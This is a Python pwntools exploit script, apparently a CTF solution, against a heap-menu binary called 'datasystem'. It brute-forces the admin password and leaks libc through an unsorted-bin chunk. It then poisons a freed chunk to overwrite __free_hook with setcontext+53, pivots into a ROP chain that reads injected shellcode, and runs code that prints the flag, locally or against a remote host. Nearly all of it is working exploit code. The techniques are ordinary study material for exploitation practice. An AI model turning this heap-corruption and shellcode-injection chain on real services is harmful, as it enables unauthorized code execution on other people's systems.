#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# -----------------------------------
# @File    :  test.py
# @Author  :  woodwhale
# @Time    :  2021/10/02 18:42:26
# -----------------------------------

from pwn import *
from LibcSearcher import *
import sys, subprocess
context.arch='amd64'
# context.log_level='debug'

arglen = len(sys.argv)
def ret2libc(leak,func,binary=null):
    libc = LibcSearcher(func,leak) if binary == null else binary
    base = leak - libc.dump(func) if binary == null else leak - libc.sym[func]
    system = base + libc.dump('system') if binary == null else base + libc.sym['system']
    binsh = base + libc.dump('str_bin_sh') if binary == null else next(libc.search(b'/bin/sh'))
    return (system,binsh)

s = lambda data : io.send(data)
sa = lambda rv,data : io.sendafter(rv,data)
sl = lambda data : io.sendline(data)
sla = lambda rv,data : io.sendlineafter(rv,data)
r = lambda num : io.recv(num)
rl = lambda keepends=True : io.recvline(keepends)
ru = lambda data,drop=True : io.recvuntil(data,drop)
ia = lambda : io.interactive()
uu32 = lambda data : u32(data.ljust(4,b'\x00'))
uu64 = lambda data : u64(data.ljust(8,b'\x00'))
i16 = lambda data : int(data,16)
leak = lambda name,addr : log.success('{} = {:#x}'.format(name, addr))
dbg = lambda point=null: (gdb.attach(io) if point == null else gdb.attach(io,f'b {point}')) if DEBUG else null
og = lambda libc : list(map(int,subprocess.check_output(['one_gadget','--raw','-f',libc]).decode().strip('\n').split(' ')))
rg = lambda binary,only,grep : i16(subprocess.check_output([f"ROPgadget --binary {binary} --only '{only}' | grep {grep}"],shell=True).decode().split(' ')[0])
set_libcaddr = lambda leak,func : leak - libc.sym[func]
libcpath = lambda binary : subprocess.check_output(['ldd',binary]).decode().replace('\t', '').split('\n')[1].split(' ')[2] if GLIBC else subprocess.check_output(['ls | grep *.so'],shell=True).decode().replace('\n', '')
proc = lambda binary,libc=null : process(binary) if GLIBC else process(binary,env={'LD_PRELOAD':'./'+libc})

# 0直接略过所有dbg
DEBUG = 0
# 0表示使用当前目录下的libc，1表示使用patcher之后的glibc
GLIBC = 0
binary = './datasystem'
elf = ELF(binary)
libc = ELF(libcpath(binary))
io = proc(binary,libcpath(binary)) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))

def getpwd():
    for c in range(0x100):
        c = c.to_bytes(1, 'big')
        p = process('./datasystem')
        p.sendafter("please input username: ", "admin\x00")
        p.sendafter("please input password: ", c*32)
        msg = p.recvline()
        if b"Fail" not in msg:
            print('='*60)
            print("a valid char:", c)
            print('='*60)
            p.close()
            return c*32
        p.close()

def login():
    pwd = getpwd()
    sla("username","admin\x00")
    sla("password",pwd)

def add(size,content="a"):
    sla(">>","1")
    sla("Size",str(size))
    sla("Content",content)

def free(index):
    sla(">>","2")
    sla("Index",str(index))

def show(index):
    sla(">>","3")
    sla("Index",str(index))

def edit(index,content):
    sla(">>","4")
    sla("Index",str(index))
    sa("Content",content)

login()

add(0x420) # 0 unsorted bin
add(0x10) # 1

free(0) # get unsorted bin

add(0x8) # 0
edit(0,"b"*7+"x")

show(0) # leak libc_base
ru("x")
libc_base = uu64(ru("\x7f",False))-0x3ec090
leak("libc_base",libc_base)

libc.address = libc_base

read_addr = libc.sym['read']
open_addr = libc.sym['open']
puts_addr = libc.sym['puts']
free_hook = libc.sym["__free_hook"]
setcontext = libc.sym['setcontext'] + 53

ret = next(libc.search(asm('ret')))
syscall = next(libc.search(asm("syscall")))
pop_rdi = next(libc.search(asm("pop rdi; ret")))
pop_rsi = next(libc.search(asm("pop rsi; ret")))
pop_rax_ret = next(libc.search(asm("pop rax; ret")))
pop_rdx_ret = next(libc.search(asm("pop rdx; ret")))
pop_rdx__rbx_ret = next(libc.search(asm("pop rdx; pop rbx; ret")))


add(0x20) # 2
free(2)
free(0)

# 创建一个fake chunk，当前这个free chunk的fd指向free_hook-0x200的地方
payload = b"bi0xbi0x"*2 + p64(0) +  p64(0x311) + p64(free_hook-0x200)
add(0x10,payload) # 0
dbg()
add(0x20) # 2
dbg()
payload = flat({
    0x200: setcontext,  # free_hook改写为setcontext+53
    0x100: 0x23330000,  # free_hook-0x100的位置放上可执行的地段
    0xa0: free_hook - 0x100,    # rsp
    0x68: 0,    # rdi
    0x70: 0x23330000,   # rsi
    0x88: 0x200,    # rdx
    0xa8: read_addr # rcx（执行）
}, filler="\x00")

add(0x20,payload) # 3
dbg()
free(3)

time.sleep(0.5)

sl(asm(shellcraft.cat("flag")))

ia()